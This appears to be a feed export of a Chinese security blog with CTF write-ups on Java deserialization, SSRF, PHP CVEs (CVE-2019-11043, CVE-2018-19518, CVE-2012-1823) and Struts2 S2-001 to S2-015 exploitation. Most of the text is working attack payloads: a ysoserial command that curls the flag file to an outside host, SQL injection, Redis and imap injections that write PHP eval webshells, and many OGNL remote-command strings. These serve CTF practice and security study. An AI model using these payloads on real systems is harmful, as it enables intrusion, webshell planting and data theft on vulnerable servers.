src="https://gitee.com/ll_nn/pic/raw/master/img/202201191927648.png"></p><p>对文件内容进行base64加密<br><code>rO0ABXNyAA5zZXJpYWxpemUuVXNlcu+QA6aeQg7OAgADTAAHYWRkcmVzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4AAUwACHRlbHBob25lcQB+AAF4cHQACeiKnOa5luW4gnQABTFfL1wvdAAFMTIxMzg=</code></p><p>rO0AB—序列化后base64都以此开头</p><h2 id="一个简单的反序列化漏洞"><a href="#一个简单的反序列化漏洞" class="headerlink" title="一个简单的反序列化漏洞"></a>一个简单的反序列化漏洞</h2><p>Java反序列化会调用<code>readObject()</code>方法，当这个方法使用不当时，可能引起漏洞利用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">serialize2</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ar<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token class-name">UnsafeClass</span> <span class="token class-name">Unsafe</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnsafeClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Unsafe</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"hack"</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//writeObject()方法将Unsafe对象写入object文件</span>        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//从文件中反序列化obj对象</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//恢复对象</span>        <span class="token class-name">UnsafeClass</span> objectFromDisk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnsafeClass</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>objectFromDisk<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">UnsafeClass</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token comment">//重写readObject()方法</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token class-name">ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>        <span class="token comment">//执行默认的readObject()方法</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行命令</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192008461.png"></p><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">Java反序列化漏洞从入门到深入</a></p><h2 id="2020-网鼎杯-朱雀组-web-think-java"><a href="#2020-网鼎杯-朱雀组-web-think-java" class="headerlink" title="2020-网鼎杯-朱雀组-web-think_java"></a>2020-网鼎杯-朱雀组-web-think_java</h2><p>给了几个class文件<br><code>Java Decompiler</code>反编译一下</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192135692.png"></p><p>看到<code>import io.swagger.annotations.ApiOperation;</code>应该想到<code>swagger-ui.html</code></p><blockquote><p>Swagger UI:提供了一个可视化的UI页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署UI项目。</p></blockquote><p><code>/common/test/sqlDict</code><br><code>SqlDict.class</code>存在sql注入<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192140037.png"></p><p>java的sql注入</p><p>payload：<code>myapp#&#39; union select pwd from user#;</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192143874.png"></p><p>得到账号为<code>admin</code>,密码为<code>admin@Rrrr_ctf_asde</code></p><p><code>/common/user/login</code>这个接口登录</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192146720.png"></p><p>可以看到data中的信息很明显时反序列化后base64，(如果开头是aced则为序列化后的hex编码)</p><p>用burp的一个插件<code>Java Deserialization Scanner</code>来探测，可以在<code>Bappstore</code> 下载<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192149384.png"></p><p>可以看到存在<code>ROME</code>型的反序列化</p><p>使用<a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>生成payload</p><p><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar ROME &quot;curl http://xx.xx.xx.xx:9000 -d @/flag&quot; &gt; 123.bin</code></p><p>对<code>123.bin</code>中的内容base64编码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"123.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>pay<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>txt1<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bearer "</span><span class="token operator">+</span>txt1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>/common/user/current</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192154930.png"><br>监听端口即可得到flag<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192211664.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;一个类要想能够被序列化和反序列化，必须实现&lt;code&gt;Serializable&lt;/code&gt;接口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;</summary>
      
    
    
    
    <category term="笔记" scheme="http://lll-nnn.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="java" scheme="http://lll-nnn.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="http://lll-nnn.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Ctfshow-Ssrf</title>
    <link href="http://lll-nnn.github.io/2022/01/12/ctfshow-ssrf/"/>
    <id>http://lll-nnn.github.io/2022/01/12/ctfshow-ssrf/</id>
    <published>2022-01-12T12:22:09.000Z</published>
    <updated>2022-01-12T13:34:49.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web351-web358"><a href="#web351-web358" class="headerlink" title="web351-web358"></a>web351-web358</h2><p>各种绕<code>127.0.0.1</code></p><ul><li><p><a href="http://sudo.cc/">http://sudo.cc</a></p></li><li><p>127.1</p></li><li><p><a href="http://0.0.0.0/">http://0/</a></p></li><li><p><a href="http://0.0.0.0/">http://0.0.0.0</a></p></li><li><p>localhost</p></li><li><p>十六进制：0x7f.0.0.1        7F000001</p></li><li><p>八进制：177.0.0.1            </p></li><li><p>十进制：2130706433</p></li><li><p>二进制：1111111000000000000000000000001</p></li><li><p>http://[::]:80/  &gt;&gt;&gt;  <a href="http://127.0.0.1/">http://127.0.0.1</a></p></li><li><p>http://①②⑦.⓪.⓪.①</p></li><li><p>短网址</p></li><li><p><a href="http://127.0.0.1/">http://127。0。0。1</a>  &gt;&gt;&gt;  <a href="http://127.0.0.1/">http://127.0.0.1</a></p></li><li><pre><code class="php">http://vps/ssrf.phpssrf.php里面的内容为：&lt;?php header(&#39;Location:127.0.0.1&#39;);?&gt;<pre class="language-none"><code class="language-none">&#96;&#96;&#96;php&lt;?phperror_reporting(0);highlight_file(__FILE__);$url&#x3D;$_POST[&#39;url&#39;];$x&#x3D;parse_url($url);if(preg_match(&#39;&#x2F;^http:\&#x2F;\&#x2F;ctf\..*show$&#x2F;i&#39;,$url))&#123;    echo file_get_contents($url);&#125;payload:url&#x3D;http:&#x2F;&#x2F;ctf.@127.0.0.1&#x2F;flag.php?show</code></pre>## web359hint:打无密码的mysql`./check.php`传参`seturl`![](https://gitee.com/ll_nn/pic/raw/master/img/202201122042838.png)</code></pre></li></ul><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>hint：<code>打redis</code><br>用<code>gopherus</code>打</p><p>手打写shell</p><p>payload：</p><pre><code>dict://127.0.0.1:6379/config:set:dir:/var/www/htmldict://127.0.0.1:6379/config:set:shell:&quot;\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e&quot;dict://127.0.0.1:6379/config:set:dbfilename:1.phpdict://127.0.0.1:6379/save</code></pre><p><code>\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e</code>—-&gt;<code>&lt;?php eval($_POST[1]);?&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web351-web358&quot;&gt;&lt;a href=&quot;#web351-web358&quot; class=&quot;headerlink&quot; title=&quot;web351-web358&quot;&gt;&lt;/a&gt;web351-web358&lt;/h2&gt;&lt;p&gt;各种绕&lt;code&gt;127.0.0.1&lt;/code&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/"/>
    
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
    <category term="ssrf" scheme="http://lll-nnn.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>PHP-CVE</title>
    <link href="http://lll-nnn.github.io/2022/01/10/PHP-CVE/"/>
    <id>http://lll-nnn.github.io/2022/01/10/PHP-CVE/</id>
    <published>2022-01-10T08:43:06.000Z</published>
    <updated>2022-04-17T15:38:13.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。<br><code>ctfshow web311</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645864.png"></p><p>抓包发现</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645192.png"><br>搜一下<br><a href="https://blog.qualys.com/product-tech/2019/10/30/php-remote-code-execution-vulnerability-cve-2019-11043">PHP Remote Code Execution Vulnerability (CVE-2019-11043)</a></p><p>具体利用：<br>工具：<a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a><br><a href="https://www.topgoer.com/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/go%E7%9A%84%E5%AE%89%E8%A3%85.html">需要安装go环境</a></p><pre><code>git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo get -v &amp;&amp; go build</code></pre><p><code>go get</code>可能会<code>time out</code><br>执行如下命令：</p><pre><code>go env -w GO111MODULE=ongo env -w GOPROXY=https://goproxy.io,direct# 设置不走 proxy 的私有仓库，多个用逗号相隔（可选）go env -w GOPRIVATE=*.gitlab.com</code></pre><p>然后<br><code>go run . &quot;http://5882cf97-4bf8-46e9-a282-e212fc598c19.challenge.ctf.show/index.php&quot;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101650720.png"></p><p>payload:<code>?a=cat fl*</code><br>多刷新几次就出来了</p><h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><p>PHP imap 远程命令执行漏洞（CVE-2018-19518）</p><blockquote><p><code>php imap</code>扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用<code>rsh</code>来连接远程<code>shell</code>，而<code>debian/ubuntu</code>中默认使用<code>ssh</code>来代替<code>rsh</code>的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><p><code>ctfshow web312</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101722105.png"></p><p>payload:<code>hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;&amp;username=123&amp;password=123</code></p><p><code>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw</code>—–&gt;<code>echo &#39;&lt;?php eval($_POST[1]);&#39; &gt; /var/www/html/1.php</code></p><p>写入马，执行命令</p><h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><p>P神的文章<br><a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）</a></p><p>影响版本：php &lt; 5.3.12 php &lt; 5.4.2</p><p>利用：<br>cgi模式下的两个参数：</p><ul><li><code>-s</code>显示文件源码</li><li><code>-d</code>指定配置项<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101744336.png"></li></ul><p>经过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码</p><p>payload：</p><pre><code>index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//inputpost：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre><hr><p>还有一个写session文件的和一个xdebug的，没有复现成功<br><a href="https://blog.csdn.net/q20010619/article/details/120594729">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2019-11043&quot;&gt;&lt;a href=&quot;#CVE-2019-11043&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-11043&quot;&gt;&lt;/a&gt;CVE-2019-11043&lt;/h2&gt;&lt;p&gt;CVE-2019-11043 是一个远程代码</summary>
      
    
    
    
    <category term="CVE" scheme="http://lll-nnn.github.io/categories/CVE/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Strut-S2-</title>
    <link href="http://lll-nnn.github.io/2022/01/08/Strut-S2-001/"/>
    <id>http://lll-nnn.github.io/2022/01/08/Strut-S2-001/</id>
    <published>2022-01-08T14:30:25.000Z</published>
    <updated>2022-01-09T08:58:52.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p><code>S2-001</code>是struts漏洞的编号</p><p>Struts2是用java语言编写的一个基于MVC设计模式的Web应用框架<br>判断是否为Strut2框架：</p><ul><li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效。</li><li>通过网页后缀来判断，如.do .action，有可能不准。</li><li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。<br><a href="https://blog.csdn.net/qq_27446553/article/details/73639456">MORE</a></li></ul><blockquote><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p></blockquote><blockquote><p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p></blockquote><p>OGNL表达式中</p><ul><li><code>%</code>   的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li><code>#</code>   的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li><code>$</code>   主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>payload:</p><pre><code>//获取tomact路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;//获取web路径%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()&#125;//命令执行%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</code></pre><p>flag再env中<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201082249732.png"><br>或者直接用工具打<br><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a><br>检测<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action</code><br>命令执行<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action -n S2-001 --exec</code></p><h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p><code>S2-003</code></p><blockquote><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过<code>#</code>来访问struts的对象，Struts2框架虽然过滤了<code>#</code>来进行过滤，但是可以通过<code>unicode</code>编码（u0023）或<code>8进制</code>（43）绕过了安全限制，达到代码执行的效果</p></blockquote><blockquote><p>影响版本：Struts 2.0.0 - Struts 2.0.11.2</p></blockquote><p><code>S2-005</code></p><blockquote><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p></blockquote><blockquote><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p></blockquote><p>工具打</p><h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p><code>S2-007</code></p><blockquote><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3</p></blockquote><p>payload:</p><blockquote><p><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;</code></p></blockquote><h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p><code>S2-008</code></p><blockquote><p>S2-008有两个洞，一个是cookie处，另一个是在开启devMode模式后的调试接口能够命令执行</p></blockquote><p>姿势2：<br>payload：</p><blockquote><p><code>devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</code></p></blockquote><p>姿势1：<br>payload：</p><blockquote><p><code>Cookie:(&#39;#_memberAccess.setAllowStaticMethodAccess(true)&#39;)(1)(2)=Aluvion; (&#39;@java.lang.Runtime@getRuntime().exec(&quot;env&quot;)&#39;)(1)(2)=Twings;</code></p></blockquote><p>不过没成功</p><p>工具打</p><h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><code>Struts2 showcase远程代码执行漏洞</code></p><p><code>S2-009</code><br>payload:</p><blockquote><p><code>/S2-009/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</code></p></blockquote><p>工具打</p><h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p><code>S2-012</code></p><blockquote><p>  如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p></blockquote><pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</code></pre><blockquote><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13</p></blockquote><p>payload:</p><pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p><code>S2-013</code></p><pre><code>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：    none - 链接不包含请求的任意参数值（默认）    get - 链接只包含 GET 请求中的参数和其值    all - 链接包含 GET 和 POST 所有参数和其值&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞影响版本：2.0.0 - 2.3.14.1</code></pre><p>payload:</p><blockquote><p><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p></blockquote><p>工具打</p><h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><pre><code>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;        &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / &quot; / 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力影响版本: 2.0.0 - 2.3.14.2</code></pre><p><code>http://d3a0fd25-58fe-4c11-a18f-99824e28344a.challenge.ctf.show/S2-015/$%7B1+1%7D.action</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091545469.png"></p><p>poc</p><blockquote><p><code>$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q&#125;.action</code></p></blockquote><p>url编码</p><blockquote><p><code>%24%7B%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream())%2C%23q%7D.action%0A</code></p></blockquote><h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><pre><code>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式影响版本: 2.0.0 - 